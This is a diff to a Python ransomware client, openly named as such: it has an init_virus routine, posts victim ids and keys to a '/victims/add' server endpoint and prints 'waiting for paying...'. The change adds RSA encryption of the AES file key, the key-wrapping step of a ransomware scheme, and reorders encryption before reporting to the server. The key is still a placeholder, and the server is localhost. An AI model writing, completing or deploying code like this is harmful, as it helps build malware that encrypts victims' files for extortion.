@@ -2,11 +2,15 @@ import os
 import uuid
 import json
 import requests
+from Crypto.PublicKey import RSA
+from base64 import b64decode, b64encode
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.Hash import SHA
 
 CUR_PATH = os.path.dirname(__file__)
 
 with open(CUR_PATH + '/pubkey', 'r') as f:
-    PUB_KEY = f.read()
+    PUB_KEY = RSA.importKey(f.read())
 ADD_URL = 'http://localhost:5000/victims/add'
 GET_URL = 'http://localhost:5000/victims/'
 HEADER = {
@@ -18,27 +22,36 @@ class Client():
     def __init__(self):
         self.id = uuid.uuid1().hex
         self.aes_key = self.gen_key()
+        print(self.id)
+        print(self.aes_key)
         self.init_virus()
-    
+
     def init_virus(self):
         print('initializing...')
+        self.enc_file()
+        self.enc_key()
         data = {
             'id': self.id,
             'aes_key': self.aes_key,
             'ransom': False
         }
         self.post_server(data, ADD_URL)
-        self.enc_file()
-        self.enc_key()
         print('waiting for paying...')
     
     def gen_key(self):
         print('generating key...')
-        return None
+        return 'aes_key'
 
-    def enc_key(self):
+    def enc_key(self, pubkey=PUB_KEY, max_len=100, sign=False):
         print('encryptint key...')
-        pass
+        mes = b64encode(self.aes_key.encode())
+        mlen = len(mes)
+        cipher = PKCS1_v1_5.new(PUB_KEY)
+        h = SHA.new(mes)
+        result = cipher.encrypt(mes + h.digest()) if sign else cipher.encrypt(mes)
+        # return b64decode(result).decode()
+        self.aes_key = b64encode(result).decode()
+
 
     def dec_key(self):
         print('decrypting key...')
@@ -70,6 +83,9 @@ class Client():
 
 if __name__ == "__main__":
     client = Client()
+    # client.aes_key = '123'
+    # # print(client.aes_key)
+    # client.enc_key()
     # data = {
     #         'id': uuid.uuid1().hex
     #     }
